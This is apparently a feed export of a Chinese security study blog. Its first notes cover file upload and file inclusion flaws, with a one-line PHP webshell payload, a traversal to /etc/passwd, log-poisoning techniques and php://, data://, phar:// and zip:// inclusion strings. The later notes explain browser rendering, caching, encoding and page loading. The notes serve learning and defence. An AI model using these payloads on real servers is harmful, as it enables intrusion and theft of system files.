<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%202.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%202.png</p>
<p>尝试再次上传渲染</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%203.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%203.png</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成功~~~~~</span><br></pre></td></tr></table></figure>

<p><strong>写入到IDAT数据块</strong></p>
<p>直接跑脚本</p>
<p><a href="jpg_second_render.php">png_second_render.php</a></p>
<blockquote>
<p>针对jpg文件</p>
</blockquote>
<p>直接上脚本</p>
<p><a href="jpg_secong_render_PLET%201.py">jpg_secong_render_PLET.py</a></p>
<p><a href="jpg_payload.php">jpg_payload.php</a></p>
<p>注意事项：</p>
<ol>
<li>需要被 imagecreatefromjpeg 渲染或再用工具</li>
<li>图片找的稍微大一点 成功率更高</li>
<li>Payload 语句越短成功率越高</li>
<li>一张图片不行就换一张 不要死磕</li>
<li>国光补充：貌似白色的图片成功率也比较高</li>
<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种payload 成功率很高</li>
</ol>
<p><strong>条件竞争—并发漏洞</strong></p>
<p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。在进行二次渲染的过程中可能存在该楼哦东</p>
<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
<p><strong>文件解析漏洞</strong></p>
<p>再iis中如果上传*.asp;1.jpg的文件，iis会将该文件当作asp文件解析；将*.asp&#x2F;目录下的所有文件会被当成asp解析；默认会将扩展名为.asa，.cdx，.cer解析为asp</p>
<p>在后端开启了cgi的情况下，请求这样的地址<code>http://www.armandhe.com/a.jpg/a.php</code> 其中a.jpg是我们请求的真实文件，a.php是不存在的一个文件，可以任意定义，此时a.jpg文件会被当作是php文件去解析执行。</p>
<p><code>对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析。 例：info.jpg后面加上/xxx.php，会将info.jpg 以php解析。</code></p>
<p><code>php的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径， 例如：当php遇到文件路径&quot;/info.jpg/xxx.php/lxh.sec&quot;时 若&quot;/info.jpg/xxx.php/lxh.sec&quot;不存在，则会去掉最后的&quot;/lxh.sec&quot;，然后判断&quot;/info.jpg/xxx.php&quot;是否存在 若存在则将/info.jpg/xxx.php，当作文件/info.jpg/xxx.php/lxh.sec 若/info.jpg/xxx.php仍不存在，则继续去掉xxx.php,依此类推。</code></p>
<p><strong>addhandler漏洞 ：AddHandler application&#x2F;x-httpd-php .jpg</strong></p>
<p>如果这样设置，所有文件名中含有.php的文件都会被当作php文件执行。</p>
<p>**换行漏洞：**php中的$修饰不仅可以匹配字符串的结尾，而且可以匹配所以这样的文件名是可以的1.php0A，如此的话就可以绕过正则表达式。</p>
<p><strong>.&#x2F; :使用move_upload_file的时候，当文件存储的路径可控的时候，路径后面的&#x2F;.会被忽略，即<code>hack.php/.</code></strong></p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/archives/4089de4e.html</url>
    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>服务端提供了从另一个页面加载另一个页面的功能，且该功能的接口是用户可控的，由于程序未对用户的输入做严格的过滤，或者过滤不够严谨，就可能导致文件包含的漏洞。文件包含的函数又include\include_once_once，include在包含一个文件时如果出错只会抛出警告，程序还是会继续执行，require则会直接结束，还有可能是file_get_contengs。这写函数将直接读取文件内容，并将文件内容原样输出到要包含文件的文件中，因为该文件拥有合乎规则的执行权限，所以，被包含文件中的恶意代码将被执行。我们利用文件包含漏洞上传的图片马往往就利用文件包含的这个特性得以执行。</p>
<p><code>需要开启allow_url_include 和 allow_url_fopen</code> 允许文件包含和允许读取文件</p>
<h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>可以使用http协议从远程包含我们的恶意代码到目标文件</p>
<p><code>?file=http://www.baidu.com/hack.php</code> 任意文件后缀都可以</p>
<h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>配合目录穿越漏洞，获取服务器本地文件系统的敏感文件、执行php代码</p>
<p><strong>目录穿越：</strong> ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>利用php默认的session存储路径及来实现恶意代码执行</p>
<p>linux session文件在目录<code>/var/lib/php/session</code>中，可以通过phpinfo搜索<code>session_save_path</code>查看，session文件的命名规则是<code>sess_phpsessionid</code> session我们可以通过抓包获取。如果用户上传的参数被写入到session中，我们就可以利用文件包含漏洞执行恶意代码，前提是当前php中间件具有对session文件及其父目录的读权限。</p>
<h3 id="sshlog文件包含"><a href="#sshlog文件包含" class="headerlink" title="sshlog文件包含"></a>sshlog文件包含</h3><p>利用ssh的日志信息，通过ssh登录时将恶意代码写入到用户名部分，再利用远程文件包含漏洞执行该文件。</p>
<p>ssh默认日志路径：<code>/var/log/auth.log</code></p>
<p>ssh登录姿势：ssh @192.168.0.102</p>
<p>日志文件中记录</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled.png</p>
<h3 id="apache2访问日志，错误日志"><a href="#apache2访问日志，错误日志" class="headerlink" title="apache2访问日志，错误日志"></a>apache2访问日志，错误日志</h3><p>日志文件路径：<code>/var/log/apache2/access.log|error.log</code></p>
<p>利用方式：直接访问不存在的路径：<code>http://www.armandhe.com/&lt;?php phpinfo();?&gt;</code> 因为url中的数据会被编码，所以在访问的时候需要抓包后，修改上传参数为为编码的格式。</p>
<p><strong>那么mysql的访问日志是不是也可以做同样的操作</strong></p>
<p><strong>上述访问日志的方式有一个前提条件就是php要有读这些目录以及文件的权限</strong></p>
<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h3 id="本地文件包含有限制的染过"><a href="#本地文件包含有限制的染过" class="headerlink" title="本地文件包含有限制的染过"></a>本地文件包含有限制的染过</h3><p>%00截断</p>
<p>路劲长度截断</p>
<p><strong>一个特性：linux中目录最长不超过4096字节，超出的部分将被丢弃，windows中目录最长不超过256字节，超过的将被丢弃</strong></p>
<p>通过…………………………………………或者..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;截断</p>
<h3 id="远程文件包含绕过"><a href="#远程文件包含绕过" class="headerlink" title="远程文件包含绕过"></a>远程文件包含绕过</h3><p>？# space空格</p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>php:&#x2F;&#x2F;filter ———-读取本地文件 只需开启allow_url_fopen</strong></p>
<p><code>?file=php://filter/convert.base64-encode/resource=file://c:/windows/win.ini</code></p>
<p>有些文件中包含一些特殊字符，直接用file协议可能无法读取成功，所以先进行base编码之后再来传输。</p>
<p><strong>php:&#x2F;&#x2F;input—————读取post数据 需同时开启两个配置项</strong></p>
<p>当代码中处理用户上传数据使用的是file_get_contents的时候就可以使用该协议</p>
<p>该函数获取原始post请求的方式是<code>file_get_contents(&quot;php://input&quot;)</code></p>
<p>那么我们就可以将<code>php://input</code> 作为参数传上去，而具体的post内容通过抓包更改请求头类型，添加请求体来实现。</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%201.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%201.png</p>
<p>可以直接在当前目录中写入木马，然后用蚁剑链接</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%202.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%202.png</p>
<p>或者直接执行操作系统命令</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e/Untitled%203.png"></p>
<p>%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2087f37670f63149bd81c49c12a755ab8e&#x2F;Untitled%203.png</p>
<p><strong>file:&#x2F;&#x2F; —————读取本地文件</strong></p>
<p><code>?file=file:///etc/passwd</code></p>
<p><strong>data:&#x2F;&#x2F;————读取本地文件 配合file_get_contents使用</strong></p>
<p><code>?file=data://text/plain;base64,cGhwaW5mbygpOw==</code></p>
<p><strong>phar:&#x2F;&#x2F;————解压缩 有效</strong></p>
<p><code>?file=phar://hack.png/hack.php</code> hack实际上是一个压缩文件，只不过后缀名在压缩完成后被手动修改伪png来绕过过滤策略，且压缩的格式必须为zip。可以配合文件上传漏洞使用</p>
<p><strong>zip:&#x2F;&#x2F;————-解压缩 有效</strong></p>
<p><code>?file=zip://hack.png#hack.php</code> hack文件是在hack.zip中真实存在的，hack是压缩文件压缩后修改的后缀名为png。功能和phar一样</p>
<p><strong>测试代码</strong>fang</p>
<p><a href="hack.zip">hack.zip</a></p>
<p><a href="pharTest.php">pharTest.php</a></p>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>关闭allow_url_include</p>
<p>将open_basedir 设置为指定目录，即只允许该目录文件被访问。</p>
<p>设置白名单</p>
<p>设置黑名单，过滤危险协议关键字，</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol>
<li>敏感文件泄露</li>
<li>被getshell</li>
<li>任意命令执行</li>
</ol>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器渲染原理</title>
    <url>/archives/a074b2a4.html</url>
    <content><![CDATA[<h1 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h1><p>用户看到页面可以分为两个阶段，页面内容加载完毕与页面资源加载完成，分别对应DOMcontentloaded 和load事件</p>
<p>DOMcontentloaded事件触发时，仅到DOM加载完毕</p>
<p>load事件触发时，页面上所有的dom,css,js 等其他资源全部加载完毕</p>
<h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><ol>
<li>浏览器解析html文档为dom树</li>
<li>浏览器解析css文档为cssom树，css对象模型</li>
<li>合并dom与cssom为渲染树</li>
<li>布局</li>
<li>将渲染树各个节点绘制到屏幕上面，这一步为绘制</li>
</ol>
<p><img src="/archives/a074b2a4/Untitled.png"></p>
<p>上述过程并不是顺序执行的，根据实际情况可能会并行、重复执行</p>
<h2 id="DOM树构建过程"><a href="#DOM树构建过程" class="headerlink" title="DOM树构建过程"></a>DOM树构建过程</h2><ul>
<li>DOM树在构建的过程中可能会被CSS和JS的加载而执行阻塞</li>
<li><code>display:none</code>的元素也会在DOM树中</li>
<li>注释也会在DOM树中</li>
<li><code>script</code>标签会在DOM树中</li>
</ul>
<p>无论是DOM还是CSSOM，都是要经过Bytes→characters→tokens→nodes→object model这个过程。</p>
<p><img src="/Untitled%201.png"></p>
<p>当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。</p>
<h2 id="构建CSS规则树"><a href="#构建CSS规则树" class="headerlink" title="构建CSS规则树"></a>构建CSS规则树</h2><p>浏览器解析CSS文件并生成CSSOM，每个CSS文件都被分析成一个StyleSheet对象，每个对象都包含CSS规则。CSS规则对象包含对应于CSS语法的选择器和声明对象以及其他对象。<br>在这个过程需要注意的是：</p>
<ul>
<li>CSS解析可以与DOM解析同时进行。</li>
<li>CSS解析与<code>script</code>的执行互斥 。</li>
<li>在Webkit内核中进行了<code>script</code>执行优化，只有在JS访问CSS时才会发生互斥。</li>
</ul>
<h2 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h2><p>通过DOM树和CSS规则树，浏览器就可以通过它两构建渲染树了。浏览器会先从DOM树的根节点开始遍历每个可见节点，然后对每个可见节点找到适配的CSS样式规则并应用。<br>有以下几点需要注意：</p>
<ul>
<li>Render Tree和DOM Tree不完全对应</li>
<li><code>display: none</code>的元素不在Render Tree中</li>
<li><code>visibility: hidden</code>的元素在Render Tree中</li>
</ul>
<p><img src="/Untitled%202.png"></p>
<p>渲染树生成后，还是没有办法渲染到屏幕上，渲染到屏幕需要得到各个节点的位置信息，这就需要布局（Layout）的处理了。</p>
<h2 id="渲染树布局"><a href="#渲染树布局" class="headerlink" title="渲染树布局"></a>渲染树布局</h2><p>布局阶段会从渲染树的根节点开始遍历，由于渲染树的每个节点都是一个Render Object对象，包含宽高，位置，背景色等样式信息。所以浏览器就可以通过这些样式信息来确定每个节点对象在页面上的确切大小和位置，布局阶段的输出就是我们常说的盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。需要注意的是：</p>
<ul>
<li><code>float</code>元素，<code>absoulte</code>元素，<code>fixed</code>元素会发生位置偏移。</li>
<li>我们常说的脱离文档流，其实就是脱离Render Tree。</li>
</ul>
<h2 id="渲染树绘制"><a href="#渲染树绘制" class="headerlink" title="渲染树绘制"></a>渲染树绘制</h2><p>在绘制阶段，浏览器会遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p>
<h1 id="浏览器核心部件"><a href="#浏览器核心部件" class="headerlink" title="浏览器核心部件"></a>浏览器核心部件</h1><p><img src="/Untitled%203.png"></p>
<p>主流的渲染引擎有webkit&#x2F;Gecko</p>
<h1 id="渲染机制的补充"><a href="#渲染机制的补充" class="headerlink" title="渲染机制的补充"></a>渲染机制的补充</h1><h2 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h2><h3 id="js渲染阻塞"><a href="#js渲染阻塞" class="headerlink" title="js渲染阻塞"></a>js渲染阻塞</h3><p>JS可以操作DOM来修改DOM结构，可以操作CSSOM来修改节点样式，这就导致了浏览器在遇到<code>&lt;script&gt;</code>标签时，DOM构建将暂停，直至脚本完成执行，然后继续构建DOM。如果脚本是外部的，会等待脚本下载完毕，再继续解析文档。现在可以在<code>script</code>标签上增加属性<code>defer</code>或者<code>async</code>。脚本解析会将脚本中改变DOM和CSS的地方分别解析出来，追加到DOM树和CSSOM规则树上。</p>
<h3 id="css渲染阻塞"><a href="#css渲染阻塞" class="headerlink" title="css渲染阻塞"></a>css渲染阻塞</h3><p>由于CSSOM负责存储渲染信息，浏览器就必须保证在合成渲染树之前，CSSOM是完备的，这种完备是指所有的CSS（内联、内部和外部）都已经下载完，并解析完，只有CSSOM和DOM的解析完全结束，浏览器才会进入下一步的渲染，这就是CSS阻塞渲染。</p>
<p>CSS阻塞渲染意味着，在CSSOM完备前，页面将一直处理白屏状态，这就是为什么样式放在<code>head</code>中，仅仅是为了更快的解析CSS，保证更快的首次渲染。</p>
<h2 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h2><p>当页面的布局发生改变的时候，必然会触发回流，触发回流必然会触发重绘</p>
<h2 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h2><p>当元素的背景颜色，背景色、边框颜色等发生变化的时候，会触发重绘</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>渲染</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器缓存机制</title>
    <url>/archives/7beb4c43.html</url>
    <content><![CDATA[<h1 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="headerlink" title="浏览器缓存机制"></a>浏览器缓存机制</h1><p>本笔记参考</p>
<p><a href="https://www.jianshu.com/p/cb72dfb0f7b3">HTTP缓存机制 &amp; cookie&#x2F;localStorage&#x2F;sessionStorage</a></p>
<p>web缓存分类：</p>
<ol>
<li>数据库数据缓存</li>
<li>服务器端缓存（代理服务器缓存，cdn缓存）</li>
<li>浏览器端缓存</li>
<li>web应用层缓存</li>
</ol>
<p>浏览器缓存机制：</p>
<ol>
<li>http缓存</li>
<li>浏览器本地存储：cookie localstorage sessionStroage</li>
</ol>
<p>web存储分为localstorage 与sessionstorage两种</p>
<p><img src="/archives/7beb4c43/Untitled.png"></p>
<p>cookie与session</p>
<p><img src="/Untitled%201.png"></p>
<h2 id="http缓存"><a href="#http缓存" class="headerlink" title="http缓存"></a>http缓存</h2><p><strong>分类：优先级依次降低</strong>，</p>
<ol>
<li>memory cache:存储在内存中给你，一旦窗口关闭，其中的缓存就消失了。一般存储一些体积较小的资源</li>
<li>service worker cache：脱离于浏览器窗体，故不能操作dom,可以实现离线缓存、消息推送与网络代理功能</li>
<li>disk cache：存储在硬盘中，读写速度较慢，但容积大，</li>
<li>push cache：一宗存在于会话截断的缓存，当session终止的时候，缓存也随之释放。</li>
</ol>
<p><strong>浏览器缓存规则</strong></p>
<ol>
<li>新鲜度：即缓存副本的有效期。</li>
<li>校验值：etag服务器通过匹配该值来判断缓存是否过期</li>
</ol>
<p><strong>浏览器的缓存控制</strong></p>
<p><img src="/Untitled%202.png"></p>
<p><strong>浏览器是否重发数据判断逻辑</strong></p>
<p><img src="/Untitled%203.png"></p>
<p>浏览器请求新资源缓存过程</p>
<p><strong>本地缓存阶段(也称强缓存)</strong>：先在本地查找该资源，如果有发现该资源，而且该资源还没有过期，就使用这一个资源，完全不会发送http请求到服务器；</p>
<p><strong>协商缓存阶段(也称弱缓存)</strong>：如果在本地缓存找到对应的资源，但是不知道该资源是否过期或者已经过期，则发一个http请求到服务器，然后服务器判断这个请求，如果请求的资源在服务器上没有改动过，则返回304，让浏览器使用本地找到的那个资源；</p>
<p><strong>缓存失败阶段</strong>：当服务器发现请求的资源已经修改过，或者这是一个新的请求(在本来没有找到资源)，服务器则返回该资源的数据，并且返回200， 当然这个是指找到资源的情况下，如果服务器上没有这个资源，则返回404。</p>
<h3 id="Last-Modified-ETag-与-Cache-Control-Expires"><a href="#Last-Modified-ETag-与-Cache-Control-Expires" class="headerlink" title="Last-Modified&#x2F;ETag 与 Cache-Control&#x2F;Expires"></a>Last-Modified&#x2F;ETag 与 Cache-Control&#x2F;Expires</h3><ul>
<li>配置 Last-Modified&#x2F;ETag的情况下，浏览器再次访问统一URI的资源，<strong>还是会发送请求到服务器</strong>询问文件是否已经修改，如果没有，服务器会只发送一个304回给浏览器，告诉浏览器直接从自己本地的缓存取数据；如果修改过那就整个数据重新发给浏览器；</li>
<li>Cache-Control&#x2F;Expires则不同，如果检测到本地的缓存还是有效的时间范围内，浏览器直接使用本地副本，<strong>不会发送任何请求</strong>。两者一起使用时， Cache-Control&#x2F;Expires的优先级要高，即<strong>当本地副本根据 Cache-Control&#x2F;Expires发现还在有效期内时，则不会再次发送请求去服务器询问修改时间 Last-Modified或实体标识 Etag了。</strong></li>
<li>一般情况下，两者会配合一起使用，因为即使服务器设置缓存时间, 当用户点击“刷新”按钮时，浏览器会忽略缓存继续向服务器发送请求，这时 Last-Modified&#x2F;ETag将能够很好利用304，从而减少响应开销。</li>
</ul>
<h3 id="有Last-Modified为什么还要有ETag？"><a href="#有Last-Modified为什么还要有ETag？" class="headerlink" title="有Last-Modified为什么还要有ETag？"></a>有Last-Modified为什么还要有ETag？</h3><p>HTTP1.1中Etag的出现主要是为了解决几个 Last-Modified 比较难解决的问题：</p>
<ul>
<li>Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的新鲜度</li>
<li>如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存</li>
<li>有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形</li>
</ul>
<p><img src="/Untitled%204.png"></p>
<p>当执行相关操作的时候，对应的响应头部字段是否有效。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器编码与解码</title>
    <url>/archives/8891b17.html</url>
    <content><![CDATA[<h1 id="浏览器编码与解码"><a href="#浏览器编码与解码" class="headerlink" title="浏览器编码与解码"></a>浏览器编码与解码</h1><h1 id="访问网站过程中涉及的编解码"><a href="#访问网站过程中涉及的编解码" class="headerlink" title="访问网站过程中涉及的编解码"></a>访问网站过程中涉及的编解码</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>在url中如果在参数部分出现&#x2F;等特殊字符，会导致浏览器对资源路径的错误判断，为了解决这个问题，引入了url编码这一概念，它是以%加字符的ascii码对应的二位十六进制数如 ‘&#x3D;%23 space&#x3D;%20 </p>
<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>在html中有一些字符是需要预留的，如&lt; &amp; 等，如果用户输入这些字符后被直接输出到html中，则可能导致浏览器在创建dom树的时候错误的识别标签的开始，从而导致错误。于是引入了html编码，有两种类型，被称为HTML编码与HTML编号。如&lt;可以被表示为：&lt;,&#60;,&#x3c;</p>
<p><code>注意：</code>&amp;开头 ;结尾</p>
<p>JS编码</p>
<p>js编码采用unicode字符集，四个字节表示一个字符</p>
<p>js常见的反斜杠方式编码处理</p>
<ul>
<li>\b退格符，\t制表符，\v垂直制表符等；</li>
<li>三位数字，不足位数用0补充，按8位原字符八进制字符编码；</li>
<li>两位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x</li>
<li>四位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u 。</li>
</ul>
<p>如\145、\x65和\u0065都代表字符e。</p>
<h1 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h1><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>url解码过程较为简单，服务器对接收到用户传输过来的URL进行解析，遇到%便自动进行解码。</p>
<h2 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h2><p>HTML解析器其实是一个状态机，在对HTML资源从上而下进行解析时遇到一个‘&lt;‘符号就会进入标签开始状态（Tag Open State），然后搜寻标签，img可以被识别为正确的标签，img1则不会识别，最后在读到最近的一个‘&gt;’时，结束标签状态进入数据状态（Data State）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;<span class="symbol">&amp;#104;</span>1&gt;Main Title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //无效代码</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>M<span class="symbol">&amp;#97;</span>inT<span class="symbol">&amp;#105;</span>tle<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> //有效代码</span><br></pre></td></tr></table></figure>

<p>上例中，第一条不会被正常解析，第二条会被正常解析，由此可将<code>html实体编码的解码是发生在DOM树构建完成后才进行的</code>，<code>故html实体编码只能出现在数据区域，不能出现在标签开始状态与结束状态，这两种状态都不会被成功解码</code>。这很重要</p>
<h2 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h2><p>得到一个html文档后，浏览器顺序构造dom树与cssom树，当遇到一个<script>标签后，dom构建被阻塞，等待js文件被加载完毕，执行完毕，之后继续构建dom树</p>
<p><strong>为什么现在的js代码被放在最后面？</strong></p>
<p>因为js代码会修改并阻塞dom的渲染，若js代码放在header中则在js执行完毕之前 ，浏览器窗口会显示一片空白，用户体验差，将js代码放在最后，能提供更好的用户体验</p>
<p>js的脚本处理模型是按照源码处理-函数解析-代码执行这个执行流来的，重点是，先解码再执行，故可对js代码中的任意内容进行编码，js都能被成功执行。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>编解码</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器访问网站过程</title>
    <url>/archives/41b7ef22.html</url>
    <content><![CDATA[<h1 id="浏览器访问网站过程"><a href="#浏览器访问网站过程" class="headerlink" title="浏览器访问网站过程"></a>浏览器访问网站过程</h1><h1 id="QUESTION1：浏览器访问网站的过程"><a href="#QUESTION1：浏览器访问网站的过程" class="headerlink" title="QUESTION1：浏览器访问网站的过程"></a>QUESTION1：浏览器访问网站的过程</h1><h2 id="step1：缓存查找"><a href="#step1：缓存查找" class="headerlink" title="step1：缓存查找"></a>step1：缓存查找</h2><p>如果改页面在短时间内被访问过，则会经过缓存茶盏来判断是否需要请求新的资源，根据max-age、expires、cache-control、if-none-match、last-modifiled、etoken等来判断是走浏览器缓存还是向服务器请求数据，走浏览器缓存则直接返回数据，响应状态设置为灰色的200。</p>
<h2 id="step1：域名解析"><a href="#step1：域名解析" class="headerlink" title="step1：域名解析"></a>step1：域名解析</h2><hr>
<p>首先浏览器需要做域名解析，在浏览器本地的缓存中寻找是否又该域名的解析，如果没有，则到主机的缓存中去寻找，如果也没有，就到主机的hosts文件中去寻找，如果仍然没有则到路由器中找，如果还没有则根据指定的本地dns地址到指定的本地域名服务器上去寻找，如果没有寻找到，则到缓存中去找，如果也没有且如果配置了转发的话，则会把这个请求转发到该域名服务器的上一级域名服务器解析，上一级域名服务器如果也没有寻找到要么再到上一级或者到根服务器去寻找，这个过程叫做<code>递归查询</code>。根服务器告知主机负责解析顶级域名的服务器的地址，顶级域名服务器告知负责二级域名解析的服务器的地址，二级域名解析服务器告知三级域名解析的服务器的地址，依次迭代，直到找到该域名的解析为止，这个过程叫做<code>迭代查询</code>。</p>
<h2 id="step2：建立tcp连接"><a href="#step2：建立tcp连接" class="headerlink" title="step2：建立tcp连接"></a>step2：建立tcp连接</h2><hr>
<p>域名解析完成后，开始建立tcp连接，连接时进行三次握手，首先客户端发送syn报文，将标志位syn设为1，同步序列号设为x,进入syn_send状态，服务器收到请求后回一个ack报文，其中标志位syn设为1，ack标志位设为1，同步序列号设为y,确认号设为x+1，进入syn_recieve状态，客户端收到确认报文之后，发送确认报文到服务器，ack标志位设为1，确认号设为y+1,进入established状态，此时tcp连接建立完毕。</p>
<h2 id="step3：发送请求"><a href="#step3：发送请求" class="headerlink" title="step3：发送请求"></a>step3：发送请求</h2><hr>
<p>tcp连接建立后开始开始传送http协议数据内容，经过tcp&#x2F;ip协议五层层层封装，数据首先在五层编码成二进制，再到4层经过tcp层加上5层协议的端口号，根据数据链路层MTU对数据进行分段，然后到3层加上ip地址与4层协议号，然后数据到了三层后，首先判断目标ip地址是不是与本机处在同一网段，如果是在同一网段，则查询arp缓存表，或者进行arp广播，如果没有在同一网段则根据本机配置的网关地址，查询arp缓存表或者广播查询网关的mac地址，完成后封装帧头帧尾，然后数据被发送网关，由网关进行地址转换，然后层层路由到服务器端。</p>
<h2 id="step4：服务器解析请求，发送数据"><a href="#step4：服务器解析请求，发送数据" class="headerlink" title="step4：服务器解析请求，发送数据"></a>step4：服务器解析请求，发送数据</h2><hr>
<p>服务器根据请求内容返回相应内容，如果请求的是静态网页，将直接由web中间件根据url中请求的内容返回对应的数据，如果请求的是动态的页面，则web中间件将请求通过socket发送到动态脚本解析器解析执行，解析器若发现需要查询数据库，则会连接数据库进行查询并将数据添加到结果中，脚本解析器解析完后，将数据发回给web中间件，web中间件再发回给浏览器。</p>
<h2 id="step5：断开连接"><a href="#step5：断开连接" class="headerlink" title="step5：断开连接"></a>step5：断开连接</h2><hr>
